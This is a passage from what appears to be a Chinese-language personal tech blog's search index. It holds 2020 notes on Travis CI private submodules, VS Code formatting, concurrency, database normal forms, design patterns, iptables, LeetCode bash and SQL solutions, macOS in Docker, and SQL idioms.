bisect\n","categories":["Utils","Git"]},{"title":"travisci抓不到private submodule","url":"/2020/6/travisci-private-submodules/","content":"動機\n不知道為什麼travisci突然抓不到private submodule\n\n作法\n在travis.yml加入\ngit:  submodules: falsebefore_install:  - sed -i &quot;s/https:\\/\\/github.com/https:\\/\\/$GH_TOKEN@github.com\\//&quot; .gitmodules  - git submodule update --init --recursive\n作法就是把gitmodules中的github網址，換成加了token的網址\nRef\nsource\n","categories":["Utils","Small project","CI","Tips"]},{"title":"設定vscode的c++ format","url":"/2020/6/vscode-cpp-style/","content":"動機\n工作的code的風格與自己平常打的code的風格差很多!!\n如果有可以自動調的會很方便。\n同時vscode的c/c++外掛，有ctags與cscope的功能，不用另外裝，\n所以變成研究如何在vscode上自動調整format\n\n作法\nvscode自動調整format\n把 setting 中的\n\nEditor: Format On Paste\nEditor: Format On Save\nEditor: Format On Type\n\n勾起來\n如果覺得不好找，可以在setting上方的搜尋欄打上 format 去找\ntab與空白混用\n\n把 Editor: Detect Indentation 與 Editor: Insert Spaces 關掉\n設定 clang-format-fallback\n\n設定clang-format-fallback\n把\n&#123;  BasedOnStyle: WebKit,  IndentWidth: 4,  TabWidth: 8,  ColumnLimit: 80,  AlignAfterOpenBracket: Align,  AlignConsecutiveMacros: true,  AlignTrailingComments: true,  UseTab: ForContinuationAndIndentation,  BraceWrapping: &#123;\tAfterFunction: false  &#125;,  SpaceBeforeParens: ControlStatements&#125;\n貼到C_Cpp: Clang_format_fallback Style去，用成一行\n一些詭異的地方\n\n\nTabSize &amp; TabWidth\n顯示tab時會依照TabSize的大小，所以如果要顯示得不會刺痛眼睛\n要去改Editor:TabSize成8\n\n\nauto indent\n還有一個奇怪的點是auto indent的部分，\n在花括號的第一行會多空4個空格\n\n\n  int main &#123;    if(1) &#123;      &quot;wow&quot;    &#125;&#125;\n但是打完分號後會vscode會自己調回去\n  int main &#123;    if(1) &#123;  &quot;wow&quot;;    &#125;&#125;\n之後再看要怎麼解多出來的空格的部分吧\nRef\nclang_format official document 必看\n","categories":["C++","Tips"]},{"title":"Seven-Concurrency-Models-in-Seven-Weeks 部分筆記","url":"/2020/7/Seven-Concurrency-Models-in-Seven-Weeks-note/","content":"動機\n感覺自己不曾了解過Concurrent programming，所以來看這本\n看能不能得到一些直覺\n\n共享變量的一致性\n\n原子性: 在操作時變數的狀態不會被其他人改變\n有序性: 指令產生的效果要照順序發生 (指令重排)\n可見性: 別人改了其他地方看的到嗎? (快取問題)\n\n要看Java Memory Model，會有更好的解釋\n同時Java Memory Model也提出一些原則讓我們預期做Concurrent時會發生什麼事\n並不限定在Java上他提出的原則是通用的\n隔離變數\n隔離變數的手法\n\nlock, access in order =&gt; 所有變數都在同一個地方\nmessage passing(actor, CSP), copy data(copy-on-write) =&gt; 變數在不一樣的地方\n\n避免deadlock\n\ntimeout then release =&gt; live lock(deadlock doesn’t last forever, no progress is made either)\nallow interrupt\ncheck states before do something =&gt; CAS(non-lock,atomic var), cond var\n\navoiding alien method calls while holding a lock are applicable to any language with threads and locks\n如何形成deadlock\ndef procA():    lockA.lock()    ...    lockB.lock()    ...def procB():    lockB.lock()    ...    lockA.lock()    ...\n只要在一個瞬間能\n\n拿到對方想要的資源 (用圖來看就是對方的箭頭指向自己)\n對方拿到自己想要的資源 (自己的箭頭指向對方)\n沒有人願意放開手上的資源\n這些資源都是唯一的只能一個proc持有 (圖的node只能有一個，我打前面三點的時候忘了這個)\n\nPriority inversion(打的時候想起來有讀過，但書上沒有)\n高優先序的proc因為其他proc在critical zone而被block，\n所以在context switch時讓其他優先序低的proc先執行了\n這裡要想到的是critical zone會讓所有用到的proc被綁在一起\n在context switch時所有用到critical zone的proc會被綁在一起\n因為都要等critical zone\n所以可以看成在context switch時可以把proc分成\n有/無critical zone\n那無critical zone的優先序就是原本的優先序\n但有critical zone的優先序是正位於critical zone的proc的優先序\navoid lock\n第二章中的第三天提到數字數的程式\n原本是只有一個counter從queue拿parser生出的task\n第二版把counter生出很多個counter想說可以提升效率\n但因為counter們反覆access紀錄結果的map所以基本上沒辦法讓多個counter同時執行\n所以把map改成可以Concurrent的map，效率順利上升了\n第三版不在把所有counter的紀錄留在同一份map上\n而是之後再一次加總完，效率又上去了\n就算是可Concurrent的map，但還是會有contention\n還是會等(non-lock)\nSTM與atomic var與actor的比較\nIn addition to atoms, Clojure also provides agents and refs:\n• Atoms enable independent, synchronous changes to single values. (atomic var)\n• Agents enable independent, asynchronous changes to single values. (可以當成actor)\n• Refs enable coordinated, synchronous changes to multiple values. (STM)\nCSP\n其實就是pipe，但如何synchronize?\n在讀或寫的時候，不能被打斷\n並block在讀不到資料時(除非pipe有buffer可以存資料，這樣寫就不會block)\nactor與channel可以當成把queue從actor抽出來\n獨立讓任何process都能存取\n","categories":["System","Parallel"]},{"title":"db正規化的隨便筆記","url":"/2020/7/db-nf-note/","content":"動機\n突然想起來 有這種東西\n就來重看一下\n\n相依(叫參照或許比較好)\n可以把table想成某種dict，\n而這個dict的key是一種pair，\n而pair丟到dict中，如果拿到只有一筆資料就是一種鍵\n也就是相依\n像是用學號去找就只會找到一個學生\n一般來說會有許多種pair都可以拿到只有一筆資料，這個叫超鍵\n把超鍵的項目去掉，去到不能再去掉就是候選鍵(對，這也可能有許多組合，學號、身分證)\n從候選鍵選一種喜歡的就是主鍵\n大概寫成code(pseudo-python)\ntable = &#123;...&#125;superKey = [tup for tup in all_combination(table.keys()) if len(table[tup]) == 1].sort(key=lambda tup: len(tup))def candicateKey():    keysIter = iter(superKey)    yield next(keysIter)    keys = candicateKey()    for tup in keys:        yielded = False        for possible_key in keysIter:            if tup.is_subset(possible_key):\t        continue\t    else:\t        yield possible_key\t\t    yielded = True        if not yielded:\t        raise StopIteration()\t         \n1NF\n就是為了因應row不能放可變長度的array所以要把Item轉90度，也因為這樣我們有了後面的種種NF\n至於那些新增、刪除與修改異常都是因為當初存可變長度的array的row不是struct\n所以不可以用pointer直接改，要轉90度重複寫下原本struct的其他資料\n2NF\n其實接下去的NF都是把可以推導出來(或是叫找出)的item抽出去\n\n看主鍵外的資料與主鍵的關係\n\n部分相依\n\n只有與主鍵的單個項目相依\n\n\n完全相依\n\n與主鍵的所有項目相依\n\n\n\n\n\n2NF就是把(針對主鍵的)部分相依抽出去，像A,B是主鍵\n{A,B} -&gt; {D, E, F}\n{B} -&gt; {D, F}\nD,F就是對B部分相依\n像是有一個成績table\nstudent ID, course ID, name, 總排名, grade\nname與總排名很明顯只與student ID有關，所以可以抽出去\n3NF\n現在可依透過所有主鍵去filter出所有資料\n3NF要看其他欄位能不能filter出其他資料\n換言之，就是看主鍵外的資料有沒有與主鍵外的資料相依\n這是在公三小?\n像B是主鍵\n{B} -&gt; {D, F}\n{D} -&gt; {F}\n這樣可以把F抽出去，這就是3NF想做的\n前面分出來的table\nstudent ID,name, 總排名\n在此name可以filter出總排名\n所以還要再把name割出來\n遞移相依: 像上面F就是透過D相依B，這就是遞移相依\n2NF與3NF差在?\n2NF是處理部分主鍵的相依\n3NF是處理非主鍵的相依\n但一般處理相依，或者應該說是分類cloumn，都是直接把有關的放在一起\n所以，2NF與3NF看起來很像，因為都是處理重複的相依，但是兩者的範疇不同\n同時順序也不一定或是先2NF再3NF\nBCNF\n看有沒有不為主鍵的項目可以相依到主鍵的某個項目?\n有的話就抽出去把cycle打斷\n假設 {A,B}是主鍵\n但\n{A, B} -&gt; {C}\n{C} -&gt; {B}\n這樣就是一個cycle的fu\n所以可以拆掉，有不同的拆法\n\n{A,C} 為主鍵，把{B,C}拉到另一張表\n{A,B} 為主鍵，把{B,C}拉到另一張表\n\n","categories":["DB","FAQ"]},{"title":"design pattern隨便筆記","url":"/2020/7/design-pattern-note/","content":"物件與lambda\n物件其實就是使用前需要new的lambda\n但\n\n物件可以有一個以上的function\n可以用繼承來傳function給父類別\n\nFactorys\n就是把物件生成抽象化\nsimple factory\n把物件生成的code抽成物件(lambda)\n用參數傳function\nmethod factory\n把物件生成的code抽成要實作的方法\n用override傳function\nabstract factory\n把所有物件生成的code\n\n放到物件中\n讓子類別實作\n\n就simple factory+method factory\n但實作method從caller本身被抽到另一個物件去\n簡介\n接著來介紹pattern的替代方案\n替代方案: lambda\nStrategy\n拉一個interface來產生一個給lambda的洞(attribute)\nTemplate Method\n拉好幾個abstract method給子類別實做需要用到的method\nBridge\n把許多function放在一起\ndict with lots of lambda\nObserver\n存callback函數，再把資料透過callback推送出去\nCommand\n真的就是lambda\n替代方案: Rrcursive data type\nDecorator\ndata List = Base | Node A List\n就是List的type，但是可能會有許多base\ninterface layer &#123;    int eval();&#125;class Base implements layer &#123;    int eval() &#123; return 0;&#125;&#125;class add10 implements layer &#123;    layer next;    public add10(layer l) &#123;\tnext = l;    &#125;    int eval() &#123; return 10+next.eval(); &#125;&#125;\nChain of Responsibility\nlinked list\nabstract class Handler &#123;    protected Handler next;    Handler(Handler next) &#123;        this.next = next;    &#125;        void doNext(char c) &#123;        if(next != null) &#123;           next.handle(c);        &#125;    &#125;    abstract void handle(char c);&#125;class SymbolHandler extends Handler &#123;    SymbolHandler(Handler next) &#123;        super(next);    &#125;    void handle(char c) &#123;        System.out.println(&quot;Symbol has been handled&quot;);        doNext(c);    &#125;&#125;public class Main &#123;    public static void main(String[] args) &#123;        Handler handler = new SymbolHandler(                            new CharacterHandler(                              new DigitHandler(null)));        handler.handle(&#x27;A&#x27;);        handler.handle(&#x27;1&#x27;);    &#125;&#125;\n(不過看著看著感覺有點monad的味道)\nComposite\ndata Tree = Leaf | Node List&lt;A&gt; List&lt;Tree&gt;\n就是Tree的type，但是可能會有許多leaf\nBuilder\nQ: 回傳的都是同一個type，那狀態如何變化?\nA: 放在attribute\n每次set完attribute就回傳Builder，最後再產生物件\nState\n把State Machine的State變成物件，之後每個State就依據呼叫的method來執行動作，與轉換狀態。\n換言之，用linked list的方式實作graph\n替代方案: Type constructor\nAdapter\n就是吃一個type，透過method使用\n那就是Type constructor阿\nType + Adapter =&gt; another Type\nProxy\n與Adapter很像，但轉出來的不是只有一般的type\n連帶還有存取的方法\n有點像python的decorator\nType + Proxy =&gt; methods for Type\n想法\nSingleton\n就是只能有一個物件\n那做的方法就有很多了\nPrototype\ndeepCopy\nFlyweight\n記憶法\nFacade\n打包成一個函數(或是公開介面)\nIterator\n把hasNext與getNext明確出來，可以變成method調用\n實做起來很有趣，Tree的Iterator一定要試試看\nInterpreter\n就是Interpreter，看操作語意可以給你許多啟發\nMemento\n可以當成物件的序列化與反序列化\n保存能代表物件的狀態，之後只要使用這些狀態就能還原出物件\nMediator\n很像 Facade, Template Method\n都是打包\n但 Facade, Template Method 打包的是method\nMediator 打包的是 物件\n替代方案: pattern matching\nVisitor\n物件本身的attribute就是函數的參數\nsize [] = 0size a:x = 1+size x\ninterface ListVisitor &#123;// Lambda    int apply(Base l);    int apply(Node l);&#125;interface List &#123;    List getNext();&#125;class size implements ListVisitor &#123;    // 其實也可以把ret寫在attribute    // 這樣就不用回傳type了    int apply(Base l) &#123; return 0; &#125;    int apply(Node l) &#123; return 1+l.apply(this); &#125;&#125;class Base implements List &#123;    List getNext() &#123; return null; &#125;    int apply(ListVisitor f) &#123; return f.accept(this); &#125;&#125;class Node implements List &#123;    List next;    public Node(List l) &#123;\tnext = l;    &#125;    List getNext() &#123; return next; &#125;    int apply(ListVisitor f) &#123; return f.accept(this); &#125;&#125;","categories":["Java","FAQ"]},{"title":"悠遊付使用一個月的心得","url":"/2020/7/easywallet-complain/","content":"動機\n當初是衝著 嗶乘車 去的\n可以直接買1280，方便\n但現實十分骨感…\n\n優點\n\n可以直接買1280\n可以用手機刷\n可以刷ubike\n\n缺點\n啟動十分慢\n雖然說可以設置捷徑在主畫面上\n不過點進去還要再登入兩次!?\n這十分違反卡片使用者原本的操作流程\n一般來說使用者大多都是從一般卡片使用者跳過來的(我)\n照理來說啟動到可以嗶的啟動時間應該要與從口袋拿出卡片的時間一樣\n但是因為初次使用加上錯誤預期，\n在使用的前一兩周，都有因啟動太慢而無法及時下公車的經驗\nWTF!?\napp不穩\n有的時候開會爆出如 參數錯誤或是null 等錯誤訊息\nWTF!?\n這個只要app重開就好，但是\n有幾次是手機的nfc完全無法嗶，自然就要手機重開了，而手機重開遠比app重開久…\n幸好都是發生在捷運出站的時候\n如果是在公車…\n結論\n最好不要當成主要使用的卡，如果是備用就剛剛好\n","categories":["Etc"]},{"title":"隨意iptables筆記","url":"/2020/7/iptables-note/","content":"動機\n記錄下自己怎麼看待iptables\niptables把firewall的功能與network stack緊緊地結合在一起\n所以有的時候會看不懂到底發生甚麼事，也不好寫出自己想要的rule\n故在此寫下自己的看法\n\ntable : something like java’s interface\nfirewall的功能有二\n\n接受/拒絕pkt\n修改pkt\n\n所以firewall會改pkt的內容(mangle,nat)，之後根據使用者的rule做接受/拒絕(filter)\n最後再return (先不算中間直接離開的情況)\n整個流程大概像\nmangle -&gt; nat -&gt; filter &lt;= 這段是進入\t\t    |\t\t   \\ /mangle &lt;- nat &lt;- filter &lt;= 這段是出去\n同樣都是修改pkt，因為nat太常用了就被獨立出來\ntable可以當成pkt在firewall中是怎麼被處理的概述，很像OO的interface\npkt會被某種程度的改動 =&gt; mangle\n在sport/dport/sip/dip改動 =&gt; nat\nfirewall的business rule =&gt; filter\nchain\nall about routing\n一個封包進入主機，會判斷\n\n我該處理嗎? &lt;= 所以有兩個chain\n最後再丟出去。\n\n所以有\n\nPREROUTING\nINPUT\nFORWARD\nOUTPUT\nPOSTROUTING\n\n寫成code\nPREROUTING()if this_pkt_is_for_this_host():    INPUT()    OUTPUT()else:    FORWARD()POSTROUTING()\n把chain與table組合一下就是wiki的這張圖\n\nNetfilter Hooks\n當pkt在network stack中流動時，會觸發netfilter的hook，再調用註冊再裡面的函數對pkt做處理\n可以看到每個hook都可以與上面的五個chain對起來\n\nNF_IP_PRE_ROUTING\nNF_IP_LOCAL_IN\nNF_IP_FORWARD\nNF_IP_LOCAL_OUT\nNF_IP_POST_ROUTING\n\nfunction &amp; jump\n每個chain都有許多rule，而這些rule就可以想成一般寫程式的指令\n以剛剛的想法為基礎，這些chain就可以想像成function!!\n但是不同於一般的function被call完後會自動回到的被call的位置\nchain中的rule只要碰到ACCEPT/DROP/REJECT/QUEUE其中一個action，就不會繼續往下跑\n其他都是繼續往下走，如果沒有rule可以執行，就會觸動chain的預設action\n順便提一下\n\n自定義的chain的預設action是RETURN，就是我們熟悉的return\nQUEUE會把pkt轉到userspace\n\nDROP/REJECT\n都是丟到pkt，但是REJECT還會回傳訊息給sender\nconnection state\nif is_tracked(): # 1. 要不要track    if is_nat(): # 2. 是不是nat\tif is_from_dnat():\t    return DNAT()\telse:\t    return SNAT()    else:\tif is_from_existing_conn():\t    return ESTABLISHED()\telif is_related_to_existing_conn():\t    return RELATED()\telse:\t    try:\t\treturn NEW()\t    except:\t\treturn INVALID()else:    return UNTRACKED() #這個與raw有關\nmark: custom state\nmark有兩種\n\nconnmark (ctmark)\nmark (nfmark)\n\n一個是針對connection的一個是針對個別封包的\n除了基本的set-mark\n還有\n\nsave-mark: 把mark寫到connmark\nrestore-mark: 把connmark寫到mark\n\nRef\n十分詳細必看\n","categories":["Network","Tips"]},{"title":"leetcode的bash題目們","url":"/2020/7/leetcode-bash/","content":"動機\nonlinejudge居然有bash的題目!!\n這麼有趣的東西當然是解爆阿!!\n\n抱怨\n有的時候會出現\nrbash: ./prog.sh: Permission denied\n這個時候就是只能調整輸入像用pipe等等\n題目\n目前只有4題\n\n192\n193\n194\n195\n\n192\ncat words.txt | tr &#x27; &#x27; &#x27;\\n&#x27; | sed &#x27;/^[[:space:]]*$/d&#x27; | sort | uniq -c | nawk &#x27;&#123;print $1&quot; &quot;$2&#125;&#x27; | sort -r -n -k 1 | nawk &#x27;&#123;print $2&quot; &quot;$1&#125;&#x27;\nbash做為一個奇怪的PL\nbash可以想成只有string的PL\n那要怎麼表現array?\n用delimiter區分，常見的是\n\nspace\nnewline\ncomma\netc…\n\n第一步: 多個array合成一條array\n\n先把空白換成斷行\n把多的斷行吃掉\n故最後會變成\n\n1 2 3 =&gt;123\ncat words.txt | tr &#x27; &#x27; &#x27;\\n&#x27; | sed &#x27;/^[[:space:]]*$/d&#x27;\n第二步: 計數\n先排好，再計算重複的單字\n| sort | uniq -c\n第三步: 依題目調整輸出\n| nawk &#x27;&#123;print $1&quot; &quot;$2&#125;&#x27; | sort -r -n -k 1 | nawk &#x27;&#123;print $2&quot; &quot;$1&#125;&#x27;\n193\ncat file.txt | egrep &quot;^\\([0-9][0-9][0-9]\\) [0-9][0-9][0-9][-][0-9][0-9][0-9][0-9]$|^[0-9][0-9][0-9][-][0-9][0-9][0-9][-][0-9][0-9][0-9][0-9]$&quot;\n這題就是regex\n194\ncat file.txt | awk &#x27;&#123;    for (j=1; j&lt;=NF; j++) &#123;\tM[NR, j] = $j    &#125;&#125;END &#123;    for (i=1; i&lt;=NR; i++) &#123;\tfor (j=i+1; j&lt;=NF; j++) &#123;\t    tmp = M[i,j]\t    M[i,j] = M[j,i]\t    M[j,i] = tmp\t&#125;\tif (NR &gt; NF) &#123;\t    for (j=NF+1; j&lt;=NR; j++) &#123;\t\ttmp = M[i,j]\t\tM[i,j] = M[j,i]\t\tM[j,i] = tmp\t    &#125;\t&#125;    &#125;    for (i=1; i&lt;=NF; i++) &#123;\tfor (j=1; j&lt;NR; j++) &#123;\t    printf &quot;%s &quot;, M[i,j]\t&#125;\tprint M[i, NR]    &#125;&#125;&#x27;\nawk與sed的使用時機\n同樣都是一行一行處理，但是\nsed只處理單行，把每行當成string\nawk可以深入到每個item(在awk叫field)，把每行當成array\n所以一般來說sed常看到用在replace或是print需要的一整行\n而awk會用在挑出在那一行中需要的item\nawk的運作方式\n一次讀一行，同時幫你分成array(index from 1)\n哪要怎麼知道現在讀到第幾行?\nNR\n哪要怎麼知道現在的array長度?\nNF\n所以如果寫成python會像\nwith open(&#x27;file.txt&#x27;) as f:    NR = 0    for line in f:\tNR += 1\tarr = &#x27; &#x27;.split(line)\tyour_awk_prog(arr, NF=len(arr), NR=NR)\n除了針對每一行的部分，還有\n\nawk啟動前(還沒讀檔，像是變數初始化的階段)\nawk讀完當案後(讀到EOF)\n可以執行的hook\n\n195\nchmod a+x file.txt # for handling Permission deniedsed &#x27;10q;d&#x27; file.txt\n就是sed參考前面的 awk與sed的使用時機\n","categories":["Algorithm","Leetcode","Bash"]},{"title":"leetcode上的sql題","url":"/2020/7/leetcode-sql/","content":"動機\nleetcode 上解 sql，潮\n同時熟悉sql怎麼用\n\n一些常用的工具\nCTE (Common Table Expression)\n就是把subquery抽到前面去\n但比起subquery，cte的table可以reference to self\n可以遞迴！！\nwindow function\n可以把table的部分資料割出來做計數與排名\n常用的是\nrank與dense_rank\n兩個的差別是在重複的資料出現時\nrank不會列在同一名\ndense_rank會列在同一名\n手法\n消除重複\n\ngroup by\nwindow function\ndistinct\n\n列舉\n\nself join\n\nvoid\n\nempty table =&gt; 所有條件式沒一個符合\nnull =&gt; left join 時沒有相對應的值\n\n把empty table轉成null\n\ncase + exists\nmax()\n\n題目\n沒有鎖的一共19題\n175. Combine Two Tables\nleft join\nselect a.FirstName, a.LastName, b.City, b.Statefrom Person aleft join Address bon a.PersonId = b.PersonId;\n176. Second Highest Salary\n用rank對每一區排序找出第二名\n但是題目有要求如果為空要是null\n但如果where找不到東西的話，整個表是空的！！\n所以還要在所以還要再包一層max，如果沒東西就會自動轉成null！！\nselect max(a.Salary) SecondHighestSalary  from (select Salary from (select id, Salary, rank () OVER (ORDER BY Salary desc) rk from Employee) b where rk = 2) a;\n177. Nth Highest Salary\n上一題的延續，但是排名是要可以重複的\n所以要改成dense_rank\nCREATE FUNCTION getNthHighestSalary(N INT) RETURNS INTBEGIN  RETURN (      # Write your MySQL query statement below.      select max(a.Salary)       from (select Salary from (select id, Salary, dense_rank () OVER (ORDER BY Salary desc) rk from Employee) b where rk = N) a  );END\n178. Rank Scores\n都寫著rank了\n就是用rank\n不過因為是要重複排名所以要用dense_rank\nselect score, dense_rank () over (order by score desc) `Rank`from Scores;\n180. Consecutive Numbers\n這裡點出sql的programming想法\n用組合出所有需要的資料在同一個row\n再用條件篩掉\n再從中產生新的資料，丟到新的table\n反覆放資料到table讓下一個table使用\n這裡的條件是 兩個row的\n\n數字\nid\n要一樣\n\n但我們需要至少三個row同時成立\n所以就join兩次這樣就有三個row了\nselect distinct a.Num ConsecutiveNumsfrom Logs ajoin Logs bon a.Num = b.Num and a.Id = b.Id+1join Logs con a.Num = c.Num and a.Id = c.Id+2\n181. Employees Earning More Than Their Managers\n就是join\nselect A.Name Employeefrom Employee Ajoin Employee Bon A.ManagerId = B.Idwhere A.Salary &gt; B.Salary \n182. Duplicate Emails\ngroup by可以把同樣的column的集合在一起\n再看集合在一起的row有多少個\nselect Emailfrom Persongroup by Emailhaving count(Email) &gt; 1\n183. Customers Who Never Order\nleft join才會有null!!\nselect name Customersfrom Customersleft join Orderson Orders.CustomerId = Customers.idwhere CustomerId is null\n184. Department Highest Salary\n先生出有rk的表\n再挑出rk是1的\nwith a as (    select Id, Name, Salary, DepartmentId, dense_rank () over (partition by DepartmentId order by Salary desc) rk    from Employee)select B.Name Department, A.Name Employee, A.Salaryfrom Ajoin Department Bon B.Id = A.DepartmentIdwhere A.rk = 1\n185. Department Top Three Salaries\n與前一題差不多\n但我寫了兩個版本\nver.1\n用or去組出來\nwith a as (    select *, dense_rank () over (partition by DepartmentId order by Salary desc) rk    from Employee )select b.Name Department , a.Name Employee, a.Salaryfrom ajoin Department b on b.Id = a.DepartmentIdwhere a.rk =1 or a.rk = 2 or a.rk = 3\nver.2\n小於3\n理所當然的，這個效能比較好\nwith a as (    select *, dense_rank () over (partition by DepartmentId order by Salary desc) rk    from Employee )select b.Name Department , a.Name Employee, a.Salaryfrom ajoin Department b on b.Id = a.DepartmentIdwhere a.rk &lt;= 3\n196. Delete Duplicate Emails\n用rank來結合同樣的email同時標上rank\n之後把rk大於1的delete就好了\nwith A as (select Id, ROW_NUMBER() OVER (PARTITION BY Email order by Id) AS rk from Person)delete from Personwhere Id = Any(select Id from A where A.rk &gt; 1)\n197. Rising Temperature\n與180很像\nselect A.Idfrom Weather Ajoin Weather Bon B.RecordDate = subdate(A.RecordDate,1)where A.Temperature &gt; B.Temperature\n262. Trips and Users\n\n把沒有ban的與在期限內的row找出來\n分別算 同一天的總交易數 與 同一天的完成交易數\n算比率，處理當天沒有任何完成交易的狀態\n\nwith ts as (    select Trips.Status, Trips.Request_at    from Trips    join Users a on Trips.Client_Id = a.Users_Id    join Users b on Trips.Driver_Id = b.Users_Id    where a.Banned = &#x27;No&#x27; and b.Banned = &#x27;No&#x27; and Trips.Request_at BETWEEN &#x27;2013-10-01&#x27; AND &#x27;2013-10-03&#x27;),a as (    select *, count(*) cnt    from ts    group by Status, Request_at),base as (    select sum(cnt) cnt, Request_at    from a    group by Request_at),comp as (    select *    from a    where Status = &#x27;completed&#x27;)select base.Request_at Day, IF(comp.cnt is not null, cast(1.0- (comp.cnt/base.cnt) as decimal(10,2)), 1.00) `Cancellation Rate`from baseleft join compon base.Request_at = comp.Request_at\n595. Big Countries\n複習基本sql用\nselect name, population ,area from World where area &gt; 3000000 or population &gt; 25000000\n596. Classes More Than 5 Students\n先用student與class group在一起\n排除同一個學生在同一個class有兩個以上的學生\n在group class找出題目要的東西\nwith a as (select *from coursesgroup by student, class)select classfrom agroup by classhaving count(*) &gt;= 5\n601. Human Traffic of Stadium\n與180很像但是這次要table中符合條件的row\n所以如果用與180同樣的做法還要多一個步驟是\n把join完的row拆回去原本的row\nwith a as (    select *    from stadium    where people &gt;= 100),b as (    select x.id id1, x.visit_date visit_date1, x.people people1,           y.id id2, y.visit_date visit_date2, y.people people2,           z.id id3, z.visit_date visit_date3, z.people people3    from a x    join a y on x.id = y.id+1    join a z on y.id = z.id+1),c as (    select id1 id, visit_date1 visit_date, people1 people    from b    union all    select id2, visit_date2, people2    from b    union all    select id3, visit_date3, people3    from b)select distinct *from corder by id\n620. Not Boring Movies\n複習基本sql\nselect id, movie, description , rating from cinema where id % 2 = 1 and description != &#x27;boring&#x27; order by rating desc\n626. Exchange Seats\n這題應該是所有sql題中讓我最愉悅的一題\nver.1\n把奇數的id加一再把偶數的id減1\n但這樣有問題如果row總數是奇數的話最後一筆會出事\n所以要特別處理！！\nwith a as (    select id+1 id, student    from seat    where id%2 = 1    union all    select id-1, student    from seat    where id%2 = 0), b as (    select *    from a    where id = 1    union all    select x.id, x.student    from a x, a y    where x.id = y.id+1     union all    select (select count(id) from a), a.student    from a    where id = (case when ((select count(id) from a) % 2) = 1 then (select max(id) from a) else 0 end))select *from border by id\nver.2\nver1把奇數的id與偶數的id分成兩個table\n再用union all接起來\n但其實只要針對id做case就好了…\nwith a as (    select count(*) total    from seat)select (case        when ((seat.id%2)=1) and seat.id != a.total then seat.id+1        when ((seat.id%2)=1) and seat.id = a.total then seat.id        else seat.id-1        end) id,    seat.studentfrom seat, aorder by id\n627. Swap Salary\n延續626的想法針對想要的欄位做case\n這裡對sex做case就可以了\nupdate salaryset sex = (case sex when &#x27;m&#x27; then &#x27;f&#x27; else &#x27;m&#x27; end)\n","categories":["Algorithm","Leetcode","SQL"]},{"title":"osx-on-docker","url":"/2020/7/osx-on-docker/","content":"動機\n可以用docker跑osx，潮\n當然要試試看\n\nsetup\nkvm part\n裝kvm(當然還有docker，但就不在這邊展開了)\nsudo apt install qemu qemu-kvm libvirt-clients libvirt-daemon-system bridge-utils virt-manager\ndocker part\n啟動的指令，但我在ubuntu跑會碰到permission denied\n如果碰到的話，跑下面的指令\ndocker pull sickcodes/docker-osxdocker run --privileged -e &quot;DISPLAY=$&#123;DISPLAY:-:0.0&#125;&quot; -v /tmp/.X11-unix:/tmp/.X11-unix sickcodes/docker-osx\npermission denied (most important on Ubuntu)\n`\nsudo chmod 666 /dev/kvm\nRef\nsource\n","categories":["Docker","Tips"]},{"title":"隨便的sql筆記","url":"/2020/7/sql-notes/","content":"動機\n整理一些sql的用法\n\n把SQL當成一種奇怪的PL\n與awk有點像，SQL的溝通單位只有類似matrix的資料結構\n不過這個matrix沒辦法用index取值\n同時每家DBMS的實作又有點差別像是CTE的部分就差很多\n產生matrix(table)\nsubquery\n最基本的產生matrix的手段\n最好都要替每個subquery加命名\nSELECT P_Name FROM products_taiwanWHERE P_Name NOT IN (SELECT P_Name FROM products_china) china;\nview\n當成matrix的抽象\nCREATE VIEW V_CustomerAS (SELECT First_Name, Last_Name, Country FROM Customer);\nfunction (&amp; stored procedure)\n可以產生table也可以產生value\nCREATE FUNCTION Sales.ufn_SalesByStore (@storeid int)  RETURNS TABLE  AS  RETURN   (      SELECT P.ProductID, P.Name, SUM(SD.LineTotal) AS &#x27;Total&#x27;      FROM Production.Product AS P       JOIN Sales.SalesOrderDetail AS SD ON SD.ProductID = P.ProductID      JOIN Sales.SalesOrderHeader AS SH ON SH.SalesOrderID = SD.SalesOrderID      JOIN Sales.Customer AS C ON SH.CustomerID = C.CustomerID      WHERE C.StoreID = @storeid      GROUP BY P.ProductID, P.Name  );  \nprocedure基本上就是把指令打包在一起\n但沒有回傳值\nCREATE PROCEDURE HumanResources.uspGetEmployeesTest2       @LastName nvarchar(50),       @FirstName nvarchar(50)   AS      SELECT FirstName, LastName, Department FROM HumanResources.vEmployeeDepartmentHistory      WHERE FirstName = @FirstName AND LastName = @LastName AND EndDate IS NULL;  GO  \n從python來看sql\nassign\nEmpIDVariable = max([row[&#x27;EmployeeID&#x27;] for row in HumanResources.Employee])\nDECLARE @EmpIDVariable int;SELECT @EmpIDVariable = MAX(EmployeeID)FROM HumanResources.Employee;\nwhile\nMyCounter = 0TestTable = [] # queuewhile MyCounter &lt; 26:    TestTable.append((MyCounter,char(int(&#x27;a&#x27;)+MyCounter)))    MyCounter += 1\nDECLARE @MyCounter int;SET @MyCounter = 0;WHILE (@MyCounter &lt; 26)BEGIN;   INSERT INTO TestTable VALUES       (@MyCounter, CHAR((@MyCounter + ASCII(&#x27;a&#x27;))));   SET @MyCounter = @MyCounter + 1;END;\ncursor\n基本款\nvend_cursor = iter(Purchasing.Vendor)next(vend_cursor)\nDECLARE vend_cursor CURSOR      FOR SELECT * FROM Purchasing.Vendor  OPEN vend_cursor  FETCH NEXT FROM vend_cursor;  \n兩個iterator\n為什麼要提兩個的iterator?\n因為sql的has_next是變數\n所以比較特別 所以再貼一個例子\nvendor_id, vendor_name, message, product = (0,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;)print(&#x27;-------- Vendor Products Report --------&#x27;)vendor_cursor = iter(sorted([&#123;&#x27;VendorID&#x27;: row[&#x27;VendorID&#x27;], &#x27;Name&#x27;: row[&#x27;Name&#x27;]&#125; for row in Purchasing.Vendor if row[&#x27;PreferredVendorStatus&#x27;] == 1],key=lambda row: row[&#x27;VendorID&#x27;]))vendor_id, vendor_name = next(vendor_cursor) # it&#x27;s tedious to access each element by key, so imagine it can be done by deconstruct &gt;_!while has_next(vendor_cursor):    &#x27;&#x27;&#x27;    In fact, WHILE @@FETCH_STATUS = 0  is euqal to while hasnext(vendor_cursor).    However, python don&#x27;t have hasnext for its iterator.    Instead, python iterator will throw an exception at the end of iteration.    Here, imagine we have has_next() in python, okay.    &#x27;&#x27;&#x27;    print(&#x27; &#x27;)    message = &#x27;----- Products From Vendor: &#x27; + vendor_name     print(message)    product_cursor = iter([...]) # it&#x27;s tedious to implement this, so skip it    product = next(product_cursor)    for product in product_cursor:        message = &#x27;         &#x27; + product    # python iterator need not to be deallocated, after it accomplish its purpose    vendor_id, vendor_name = next(vendor_cursor)# python iterator need not to be deallocated, after it accomplish its 